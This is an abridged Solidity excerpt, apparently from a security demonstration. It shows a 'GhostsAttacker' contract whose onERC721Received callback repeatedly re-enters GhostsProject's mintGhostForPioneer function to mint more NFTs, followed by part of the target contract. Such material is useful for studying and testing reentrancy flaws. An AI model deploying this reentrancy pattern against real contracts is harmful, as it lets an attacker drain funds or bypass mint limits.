...
import "./GhostsProject.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract GhostsAttacker is IERC721Receiver {
    GhostsProject public ghostsProject;

    constructor(address _ghostsProjectAddress) {
        console.log("Deploying a Attacker connected to GhostsProject");
        ghostsProject = GhostsProject(_ghostsProjectAddress);
    }
    ...
    function onERC721Received(
        ...
        if (address(this).balance > 0.1 ether) {
            if (ghostsProject.totalSupply() < ghostsProject.getMaxGhosts()) {
                ghostsProject.mintGhostForPioneer{value: 0.1 ether}(1);
            }
        }
...
contract GhostsProject is ERC721Enumerable, Administration, GhostBase {
    ...
    uint256 public ghostPrice = 0.1 ether;
